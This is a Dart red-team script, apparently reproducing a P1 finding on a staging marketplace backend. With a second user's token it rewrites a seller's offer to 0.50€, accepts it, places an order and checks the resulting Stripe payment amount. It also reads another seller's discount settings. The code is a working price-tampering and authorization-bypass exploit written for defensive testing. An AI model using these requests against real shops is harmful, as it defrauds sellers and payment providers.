/// Pass 4: reproduce P1 independently + observe reservation/bag + leftover classes.
import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;
import '../live_ops_staging_client.dart';

const projectMust = 'fxdknzrqjenzqcvnwqqq';
final matrix = <Map<String, dynamic>>[];
final findings = <Map<String, dynamic>>[];

void rec(String s, String a, String i, String r, {String impact = '', Object? e}) {
  matrix.add({'surface': s, 'attack': a, 'identity': i, 'result': r, 'impact': impact, 'evidence': e});
}

String brief(http.Response r) {
  var b = r.body;
  if (b.length > 300) b = '${b.substring(0, 300)}…';
  return '${r.statusCode} $b';
}

Map<String, String> hJwt(String anon, String jwt) => {
      'apikey': anon,
      'Authorization': 'Bearer $jwt',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };

Future<void> main() async {
  final env = loadLiveOpsStagingEnv();
  final url = normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL'));
  if (!url.contains(projectMust)) exit(2);
  final anon = envRequire(env, 'SUPABASE_ANON_KEY');
  final svc = envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY');
  final sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');
  final admin = LiveOpsStagingClient(url: url, anonKey: anon, serviceRoleKey: svc);
  final sellerJwt = await admin.signIn(
      email: envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL'),
      password: envRequire(env, 'LIVE_OPS_TEST_SELLER_PASSWORD'));
  final stamp = DateTime.now().toUtc().millisecondsSinceEpoch;
  final email = 'rt1719p4-$stamp@fleaber.invalid';
  final helperId = await admin.createAdminUser(email: email, password: 'Rt1719-P4-Help-9x!');
  final helperJwt = await admin.signIn(email: email, password: 'Rt1719-P4-Help-9x!');
  final hH = hJwt(anon, helperJwt);
  final hS = hJwt(anon, sellerJwt);

  final prod = await admin.insert('products', {
    'seller_id': sellerId,
    'title': 'RT1719P4 reproduce',
    'price': 25.00,
    'quantity': 2,
    'state': 'Bom',
    'is_sold': false,
    'list_on_marketplace': true,
  });
  final pid = prod['id'].toString();

  final ins = await http.post(Uri.parse('$url/rest/v1/product_offers'),
      headers: hS,
      body: jsonEncode({
        'product_id': pid,
        'buyer_id': helperId,
        'seller_id': sellerId,
        'amount': 20.00,
        'list_price': 25.00,
        'offered_by': 'seller',
      }));
  rec('product_offers', 'seller 20€ to helper', 'seller', brief(ins));
  final oid = (jsonDecode(ins.body) as List).first['id'].toString();
  final mut = await http.patch(Uri.parse('$url/rest/v1/product_offers?id=eq.$oid'),
      headers: hH, body: jsonEncode({'amount': 0.50}));
  rec('product_offers', 'helper PATCH seller offer → 0.50', 'helper', brief(mut));
  final acc = await http.patch(Uri.parse('$url/rest/v1/product_offers?id=eq.$oid'),
      headers: hH, body: jsonEncode({'status': 'accepted', 'amount': 20}));
  rec('product_offers', 'helper accept', 'helper', brief(acc));
  final offer = (await admin.select('product_offers', filter: 'id=eq.$oid', limit: 1)).first;
  rec('product_offers', 'observe accepted', 'observe',
      'amount=${offer['amount']} status=${offer['status']}', e: offer);

  final ord = await http.post(Uri.parse('$url/rest/v1/orders'),
      headers: hH,
      body: jsonEncode({
        'product_id': pid,
        'buyer_id': helperId,
        'seller_id': sellerId,
        'quantity': 1,
        'payment_method': 'Pagamento na app',
        'shipping_method': 'Entrega em mão (€0.00)',
        'status': 'reserva_pendente',
        'product_offer_id': oid,
      }));
  rec('orders', 'helper INSERT', 'helper', brief(ord));
  final orderId = (jsonDecode(ord.body) as List).first['id'].toString();
  final orow = (await admin.select('orders', filter: 'id=eq.$orderId', limit: 1)).first;
  rec('orders', 'contract', 'observe',
      'contract=${orow['contract_unit_cents']} price=${orow['price_total']}', e: orow);

  final pay = await http.post(Uri.parse('$url/functions/v1/create-payment-intent'),
      headers: {
        'apikey': anon,
        'Authorization': 'Bearer $helperJwt',
        'Content-Type': 'application/json',
      },
      body: jsonEncode({
        'buyer_id': helperId,
        'order_id': orderId,
        'shipping_method': 'Entrega em mão (€0.00)',
      }));
  rec('checkout', 'helper session', 'helper', brief(pay), e: pay.body);
  final cents = jsonDecode(pay.body)['server_amount_cents'];
  if (pay.statusCode < 400 && cents is num && cents < 1500) {
    findings.add({
      'id': 'RT1719-20b',
      'severity': 'P1',
      'title': 'Independent reproduction: helper mutates seller offer then Stripe 0.50-class',
      'actor': 'helper JWT',
      'impact': 'server_amount_cents=$cents vs 20€ intended / 25€ catalog',
      'estado': 'ABERTO',
      'evidence': {'offer': offer, 'order': orow, 'checkout': pay.body},
    });
    stdout.writeln('FINDING RT1719-20b P1 reproduce cents=$cents');
  }

  // Observe reservation from pass3
  final res = await admin.select('live_reservation_requests',
      filter: 'id=eq.f9df80dd-60d6-4e9e-8e2a-2aa61c9a41ff', limit: 1);
  rec('live_reservation_requests', 'observe pass3 insert', 'observe',
      res.isEmpty ? 'gone' : 'qty=${res.first['requested_qty']} status=${res.first['status']}',
      e: res);

  // Bag checkout amount from pass3
  final bagBody = File('tool/redteam_blind_indep_20260830T1719/out/pass3.json').readAsStringSync();
  rec('bag', 'note', 'observe', 'see pass3 matrix for server_amount');

  // Bundle table
  final disc = await http.get(
      Uri.parse('$url/rest/v1/seller_bundle_discounts?seller_id=eq.$sellerId&select=*'),
      headers: hH);
  rec('seller_bundle_discounts', 'helper GET seller config', 'helper', brief(disc));

  Directory('tool/redteam_blind_indep_20260830T1719/out').createSync(recursive: true);
  File('tool/redteam_blind_indep_20260830T1719/out/pass4.json').writeAsStringSync(
    const JsonEncoder.withIndent('  ').convert({'pass': 4, 'matrix': matrix, 'findings': findings}),
  );
  stdout.writeln('PASS4 done findings=${findings.length}');
}
